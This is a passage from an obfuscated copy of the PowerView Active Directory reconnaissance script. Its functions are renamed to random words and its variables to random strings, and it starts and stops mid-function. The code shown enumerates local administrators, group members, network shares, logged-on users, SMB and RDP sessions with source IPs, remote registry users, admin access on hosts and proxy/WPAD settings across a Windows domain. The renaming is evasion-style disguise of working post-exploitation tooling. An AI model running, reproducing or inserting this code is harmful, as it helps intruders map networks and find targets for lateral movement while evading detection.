        if ($PSBoundParameters['Domain']) {
            $XVFWmInN99['Domain'] = $jnYnRnFJ99
            $AGFeaaHg99['Domain'] = $jnYnRnFJ99
        }
        if ($ysEjxCvL99 -eq 'All') {
            $XVFWmInN99['Identity'] = '*'
        }
        elseif ($ysEjxCvL99 -eq 'Domain') {
            $XVFWmInN99['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($ysEjxCvL99 -eq 'DomainController') -or ($ysEjxCvL99 -eq 'DC')) {
            $XVFWmInN99['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $XVFWmInN99['Identity'] = $ysEjxCvL99
        }
        $JSieCKTH99 = bridals @SearcherArguments
        ForEach ($GPO in $JSieCKTH99) {
            $XDtbSiRX99 = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
            $vmWPkXAG99 =  @{
                'GptTmplPath' = $XDtbSiRX99
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $vmWPkXAG99['Credential'] = $fjBNCklg99 }
            Chesterfield @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}
function centenarians {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = $Env:COMPUTERNAME,
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $bZssbhYP99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
        }
    }
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            if ($bZssbhYP99 -eq 'API') {
                $IkEQiMCD99 = 1
                $hkPfVWUa99 = [IntPtr]::Zero
                $OTFJWqdV99 = 0
                $lFxdfSrp99 = 0
                $FdGkMufw99 = 0
                $tYBpqgGN99 = $goUSoGqx99::NetLocalGroupEnum($GocAGaEB99, $IkEQiMCD99, [ref]$hkPfVWUa99, -1, [ref]$OTFJWqdV99, [ref]$lFxdfSrp99, [ref]$FdGkMufw99)
                $TlmuwuKV99 = $hkPfVWUa99.ToInt64()
                if (($tYBpqgGN99 -eq 0) -and ($TlmuwuKV99 -gt 0)) {
                    $zgglosHg99 = $exWvDLMq99::GetSize()
                    for ($i = 0; ($i -lt $OTFJWqdV99); $i++) {
                        $wGgfzjvl99 = New-Object System.Intptr -ArgumentList $TlmuwuKV99
                        $Info = $wGgfzjvl99 -as $exWvDLMq99
                        $TlmuwuKV99 = $wGgfzjvl99.ToInt64()
                        $TlmuwuKV99 += $zgglosHg99
                        $iqvwZgEM99 = New-Object PSObject
                        $iqvwZgEM99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                        $iqvwZgEM99 | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $iqvwZgEM99 | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $iqvwZgEM99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $iqvwZgEM99
                    }
                    $Null = $goUSoGqx99::NetApiBufferFree($hkPfVWUa99)
                }
                else {
                    Write-Verbose "[centenarians] Error: $(([ComponentModel.Win32Exception] $tYBpqgGN99).Message)"
                }
            }
            else {
                $dvGvCIun99 = [ADSI]"WinNT://$GocAGaEB99,computer"
                $dvGvCIun99.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $iqvwZgEM99 = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                    $Group | Add-Member Noteproperty 'GroupName' ($iqvwZgEM99.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($iqvwZgEM99.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($iqvwZgEM99.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function eyestrain {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = $Env:COMPUTERNAME,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $EidYTRyh99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $bZssbhYP99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
        }
    }
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            if ($bZssbhYP99 -eq 'API') {
                $IkEQiMCD99 = 2
                $hkPfVWUa99 = [IntPtr]::Zero
                $OTFJWqdV99 = 0
                $lFxdfSrp99 = 0
                $FdGkMufw99 = 0
                $tYBpqgGN99 = $goUSoGqx99::NetLocalGroupGetMembers($GocAGaEB99, $EidYTRyh99, $IkEQiMCD99, [ref]$hkPfVWUa99, -1, [ref]$OTFJWqdV99, [ref]$lFxdfSrp99, [ref]$FdGkMufw99)
                $TlmuwuKV99 = $hkPfVWUa99.ToInt64()
                $VztYncUI99 = @()
                if (($tYBpqgGN99 -eq 0) -and ($TlmuwuKV99 -gt 0)) {
                    $zgglosHg99 = $IncleUGn99::GetSize()
                    for ($i = 0; ($i -lt $OTFJWqdV99); $i++) {
                        $wGgfzjvl99 = New-Object System.Intptr -ArgumentList $TlmuwuKV99
                        $Info = $wGgfzjvl99 -as $IncleUGn99
                        $TlmuwuKV99 = $wGgfzjvl99.ToInt64()
                        $TlmuwuKV99 += $zgglosHg99
                        $eCwYGmel99 = ''
                        $cizHpjEZ99 = $MWNOHLIM99::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$eCwYGmel99);$WwgbwQff99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($cizHpjEZ99 -eq 0) {
                            Write-Verbose "[eyestrain] Error: $(([ComponentModel.Win32Exception] $WwgbwQff99).Message)"
                        }
                        else {
                            $AJyGNBNz99 = New-Object PSObject
                            $AJyGNBNz99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                            $AJyGNBNz99 | Add-Member Noteproperty 'GroupName' $EidYTRyh99
                            $AJyGNBNz99 | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $AJyGNBNz99 | Add-Member Noteproperty 'SID' $eCwYGmel99
                            $QTriWEIL99 = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $AJyGNBNz99 | Add-Member Noteproperty 'IsGroup' $QTriWEIL99
                            $AJyGNBNz99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $VztYncUI99 += $AJyGNBNz99
                        }
                    }
                    $Null = $goUSoGqx99::NetApiBufferFree($hkPfVWUa99)
                    $MNXfcFkv99 = $VztYncUI99 | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($MNXfcFkv99) {
                        $MNXfcFkv99 = $MNXfcFkv99.Substring(0, $MNXfcFkv99.LastIndexOf('-'))
                        $VztYncUI99 | ForEach-Object {
                            if ($_.SID -match $MNXfcFkv99) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $VztYncUI99 | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $VztYncUI99
                }
                else {
                    Write-Verbose "[eyestrain] Error: $(([ComponentModel.Win32Exception] $tYBpqgGN99).Message)"
                }
            }
            else {
                try {
                    $tlIowLRq99 = [ADSI]"WinNT://$GocAGaEB99/$EidYTRyh99,group"
                    $tlIowLRq99.psbase.Invoke('Members') | ForEach-Object {
                        $AJyGNBNz99 = New-Object PSObject
                        $AJyGNBNz99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                        $AJyGNBNz99 | Add-Member Noteproperty 'GroupName' $EidYTRyh99
                        $rSkyZbQg99 = ([ADSI]$_)
                        $KqeDRtWa99 = $rSkyZbQg99.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $QTriWEIL99 = ($rSkyZbQg99.SchemaClassName -like 'group')
                        if(([regex]::Matches($KqeDRtWa99, '/')).count -eq 1) {
                            $ybKOrfxO99 = $True
                            $Name = $KqeDRtWa99.Replace('/', '\')
                        }
                        else {
                            $ybKOrfxO99 = $False
                            $Name = $KqeDRtWa99.Substring($KqeDRtWa99.IndexOf('/')+1).Replace('/', '\')
                        }
                        $AJyGNBNz99 | Add-Member Noteproperty 'AccountName' $Name
                        $AJyGNBNz99 | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($rSkyZbQg99.InvokeGet('ObjectSID'),0)).Value)
                        $AJyGNBNz99 | Add-Member Noteproperty 'IsGroup' $QTriWEIL99
                        $AJyGNBNz99 | Add-Member Noteproperty 'IsDomain' $ybKOrfxO99
                        $AJyGNBNz99
                    }
                }
                catch {
                    Write-Verbose "[eyestrain] Error for $GocAGaEB99 : $_"
                }
            }
        }
    }
    
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function temper {
    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
        }
    }
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            $IkEQiMCD99 = 1
            $hkPfVWUa99 = [IntPtr]::Zero
            $OTFJWqdV99 = 0
            $lFxdfSrp99 = 0
            $FdGkMufw99 = 0
            $tYBpqgGN99 = $goUSoGqx99::NetShareEnum($GocAGaEB99, $IkEQiMCD99, [ref]$hkPfVWUa99, -1, [ref]$OTFJWqdV99, [ref]$lFxdfSrp99, [ref]$FdGkMufw99)
            $TlmuwuKV99 = $hkPfVWUa99.ToInt64()
            if (($tYBpqgGN99 -eq 0) -and ($TlmuwuKV99 -gt 0)) {
                $zgglosHg99 = $oGsVQmGJ99::GetSize()
                for ($i = 0; ($i -lt $OTFJWqdV99); $i++) {
                    $wGgfzjvl99 = New-Object System.Intptr -ArgumentList $TlmuwuKV99
                    $Info = $wGgfzjvl99 -as $oGsVQmGJ99
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $TlmuwuKV99 = $wGgfzjvl99.ToInt64()
                    $TlmuwuKV99 += $zgglosHg99
                    $Share
                }
                $Null = $goUSoGqx99::NetApiBufferFree($hkPfVWUa99)
            }
            else {
                Write-Verbose "[temper] Error: $(([ComponentModel.Win32Exception] $tYBpqgGN99).Message)"
            }
        }
    }
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function simplifications {
    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
        }
    }
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            $IkEQiMCD99 = 1
            $hkPfVWUa99 = [IntPtr]::Zero
            $OTFJWqdV99 = 0
            $lFxdfSrp99 = 0
            $FdGkMufw99 = 0
            $tYBpqgGN99 = $goUSoGqx99::NetWkstaUserEnum($GocAGaEB99, $IkEQiMCD99, [ref]$hkPfVWUa99, -1, [ref]$OTFJWqdV99, [ref]$lFxdfSrp99, [ref]$FdGkMufw99)
            $TlmuwuKV99 = $hkPfVWUa99.ToInt64()
            if (($tYBpqgGN99 -eq 0) -and ($TlmuwuKV99 -gt 0)) {
                $zgglosHg99 = $PxUMqzsP99::GetSize()
                for ($i = 0; ($i -lt $OTFJWqdV99); $i++) {
                    $wGgfzjvl99 = New-Object System.Intptr -ArgumentList $TlmuwuKV99
                    $Info = $wGgfzjvl99 -as $PxUMqzsP99
                    $QeiSMboC99 = $Info | Select-Object *
                    $QeiSMboC99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                    $QeiSMboC99.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $TlmuwuKV99 = $wGgfzjvl99.ToInt64()
                    $TlmuwuKV99 += $zgglosHg99
                    $QeiSMboC99
                }
                $Null = $goUSoGqx99::NetApiBufferFree($hkPfVWUa99)
            }
            else {
                Write-Verbose "[simplifications] Error: $(([ComponentModel.Win32Exception] $tYBpqgGN99).Message)"
            }
        }
    }
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function Roeg {
    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
        }
    }
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            $IkEQiMCD99 = 10
            $hkPfVWUa99 = [IntPtr]::Zero
            $OTFJWqdV99 = 0
            $lFxdfSrp99 = 0
            $FdGkMufw99 = 0
            $tYBpqgGN99 = $goUSoGqx99::NetSessionEnum($GocAGaEB99, '', $PYHFAZKa99, $IkEQiMCD99, [ref]$hkPfVWUa99, -1, [ref]$OTFJWqdV99, [ref]$lFxdfSrp99, [ref]$FdGkMufw99)
            $TlmuwuKV99 = $hkPfVWUa99.ToInt64()
            if (($tYBpqgGN99 -eq 0) -and ($TlmuwuKV99 -gt 0)) {
                $zgglosHg99 = $uraRgDbR99::GetSize()
                for ($i = 0; ($i -lt $OTFJWqdV99); $i++) {
                    $wGgfzjvl99 = New-Object System.Intptr -ArgumentList $TlmuwuKV99
                    $Info = $wGgfzjvl99 -as $uraRgDbR99
                    $nZknnAWD99 = $Info | Select-Object *
                    $nZknnAWD99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                    $nZknnAWD99.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $TlmuwuKV99 = $wGgfzjvl99.ToInt64()
                    $TlmuwuKV99 += $zgglosHg99
                    $nZknnAWD99
                }
                $Null = $goUSoGqx99::NetApiBufferFree($hkPfVWUa99)
            }
            else {
                Write-Verbose "[Roeg] Error: $(([ComponentModel.Win32Exception] $tYBpqgGN99).Message)"
            }
        }
    }
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function rapes {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = 'localhost'
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
        }
    }
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            try {
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$cSHFXHUa99")
                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $PYHFAZKa99 = belonging -ObjectSID $_ -EsfqZxkA99 'DomainSimple'
                    if ($PYHFAZKa99) {
                        $PYHFAZKa99, $CQMlcaaA99 = $PYHFAZKa99.Split('@')
                    }
                    else {
                        $PYHFAZKa99 = $_
                        $CQMlcaaA99 = $Null
                    }
                    $LdPABbwI99 = New-Object PSObject
                    $LdPABbwI99 | Add-Member Noteproperty 'ComputerName' "$cSHFXHUa99"
                    $LdPABbwI99 | Add-Member Noteproperty 'UserDomain' $CQMlcaaA99
                    $LdPABbwI99 | Add-Member Noteproperty 'UserName' $PYHFAZKa99
                    $LdPABbwI99 | Add-Member Noteproperty 'UserSID' $_
                    $LdPABbwI99.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $LdPABbwI99
                }
            }
            catch {
                Write-Verbose "[rapes] Error opening remote registry on '$cSHFXHUa99' : $_"
            }
        }
    }
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function illustrators {
    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
        }
    }
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            $JUTevqFP99 = $kmByfDyP99::WTSOpenServerEx($GocAGaEB99)
            if ($JUTevqFP99 -ne 0) {
                $WESyJWCX99 = [IntPtr]::Zero
                $GrwTALrM99 = 0
                $tYBpqgGN99 = $kmByfDyP99::WTSEnumerateSessionsEx($JUTevqFP99, [ref]1, 0, [ref]$WESyJWCX99, [ref]$GrwTALrM99);$WwgbwQff99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                $TlmuwuKV99 = $WESyJWCX99.ToInt64()
                if (($tYBpqgGN99 -ne 0) -and ($TlmuwuKV99 -gt 0)) {
                    $zgglosHg99 = $INCxtory99::GetSize()
                    for ($i = 0; ($i -lt $GrwTALrM99); $i++) {
                        $wGgfzjvl99 = New-Object System.Intptr -ArgumentList $TlmuwuKV99
                        $Info = $wGgfzjvl99 -as $INCxtory99
                        $wtQptwls99 = New-Object PSObject
                        if ($Info.pHostName) {
                            $wtQptwls99 | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            $wtQptwls99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                        }
                        $wtQptwls99 | Add-Member Noteproperty 'SessionName' $Info.pSessionName
                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            $wtQptwls99 | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $wtQptwls99 | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }
                        $wtQptwls99 | Add-Member Noteproperty 'ID' $Info.SessionID
                        $wtQptwls99 | Add-Member Noteproperty 'State' $Info.State
                        $mpEWlMJl99 = [IntPtr]::Zero
                        $laKJhaWu99 = 0
                        $cizHpjEZ99 = $kmByfDyP99::WTSQuerySessionInformation($JUTevqFP99, $Info.SessionID, 14, [ref]$mpEWlMJl99, [ref]$laKJhaWu99);$nIhAxZKV99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($cizHpjEZ99 -eq 0) {
                            Write-Verbose "[illustrators] Error: $(([ComponentModel.Win32Exception] $nIhAxZKV99).Message)"
                        }
                        else {
                            $TnkezrKB99 = $mpEWlMJl99.ToInt64()
                            $MIZfEDvN99 = New-Object System.Intptr -ArgumentList $TnkezrKB99
                            $Info2 = $MIZfEDvN99 -as $JHLqEGfY99
                            $ioJvoxJz99 = $Info2.Address
                            if ($ioJvoxJz99[2] -ne 0) {
                                $ioJvoxJz99 = [String]$ioJvoxJz99[2]+'.'+[String]$ioJvoxJz99[3]+'.'+[String]$ioJvoxJz99[4]+'.'+[String]$ioJvoxJz99[5]
                            }
                            else {
                                $ioJvoxJz99 = $Null
                            }
                            $wtQptwls99 | Add-Member Noteproperty 'SourceIP' $ioJvoxJz99
                            $wtQptwls99.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $wtQptwls99
                            $Null = $kmByfDyP99::WTSFreeMemory($mpEWlMJl99)
                            $TlmuwuKV99 += $zgglosHg99
                        }
                    }
                    $Null = $kmByfDyP99::WTSFreeMemoryEx(2, $WESyJWCX99, $GrwTALrM99)
                }
                else {
                    Write-Verbose "[illustrators] Error: $(([ComponentModel.Win32Exception] $WwgbwQff99).Message)"
                }
                $Null = $kmByfDyP99::WTSCloseServer($JUTevqFP99)
            }
            else {
                Write-Verbose "[illustrators] Error opening the Remote Desktop Session Host (RD Session Host) server for: $cSHFXHUa99"
            }
        }
    }
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function tampers {
    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
        }
    }
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            $JUTevqFP99 = $MWNOHLIM99::OpenSCManagerW("\\$GocAGaEB99", 'ServicesActive', 0xF003F);$WwgbwQff99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $XSBoqthk99 = New-Object PSObject
            $XSBoqthk99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
            if ($JUTevqFP99 -ne 0) {
                $Null = $MWNOHLIM99::CloseServiceHandle($JUTevqFP99)
                $XSBoqthk99 | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[tampers] Error: $(([ComponentModel.Win32Exception] $WwgbwQff99).Message)"
                $XSBoqthk99 | Add-Member Noteproperty 'IsAdmin' $False
            }
            $XSBoqthk99.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $XSBoqthk99
        }
    }
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function locking {
    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $kYavoJZJ99 = watchman -fjBNCklg99 $fjBNCklg99
        }
    }
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            if ($GocAGaEB99 -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $fSaBbaUR99 = $GocAGaEB99
                $GocAGaEB99 = [System.Net.Dns]::GetHostByAddress($GocAGaEB99) | Select-Object -ExpandProperty HostName
            }
            else {
                $fSaBbaUR99 = @(loneliest -cSHFXHUa99 $GocAGaEB99)[0].IPAddress
            }
            $hkPfVWUa99 = [IntPtr]::Zero
            $tYBpqgGN99 = $goUSoGqx99::DsGetSiteName($GocAGaEB99, [ref]$hkPfVWUa99)
            $pjNiFmhq99 = New-Object PSObject
            $pjNiFmhq99 | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
            $pjNiFmhq99 | Add-Member Noteproperty 'IPAddress' $fSaBbaUR99
            if ($tYBpqgGN99 -eq 0) {
                $iSntscLt99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($hkPfVWUa99)
                $pjNiFmhq99 | Add-Member Noteproperty 'SiteName' $iSntscLt99
            }
            else {
                Write-Verbose "[locking] Error: $(([ComponentModel.Win32Exception] $tYBpqgGN99).Message)"
                $pjNiFmhq99 | Add-Member Noteproperty 'SiteName' ''
            }
            $pjNiFmhq99.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')
            $Null = $goUSoGqx99::NetApiBufferFree($hkPfVWUa99)
            $pjNiFmhq99
        }
    }
    END {
        if ($kYavoJZJ99) {
            podiatrist -zkuRoAPL99 $kYavoJZJ99
        }
    }
}
function Blackburn {
    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = $Env:COMPUTERNAME,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            try {
                $exXipsBX99 = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $GocAGaEB99
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $exXipsBX99['Credential'] = $fjBNCklg99 }
                $tvKeXLyY99 = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'
                $HKCU = 2147483649
                $QTicwgzt99 = $tvKeXLyY99.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $kMEGYGZp99 = $tvKeXLyY99.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue
                $Wpad = ''
                if ($kMEGYGZp99 -and ($kMEGYGZp99 -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($kMEGYGZp99)
                    }
                    catch {
                        Write-Warning "[Blackburn] Error connecting to AutoConfigURL : $kMEGYGZp99"
                    }
                }
                if ($QTicwgzt99 -or $kMEGYGZp99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $GocAGaEB99
                    $Out | Add-Member Noteproperty 'ProxyServer' $QTicwgzt99
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $kMEGYGZp99
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[Blackburn] No proxy settings found for $cSHFXHUa99"
                }
            }
            catch {
                Write-Warning "[Blackburn] Error enumerating proxy settings for $cSHFXHUa99 : $_"
            }
        }
    }
}
function mushing {
    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cSHFXHUa99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($GocAGaEB99 in $cSHFXHUa99) {
            $HKLM = 2147483650
            $exXipsBX99 = @{
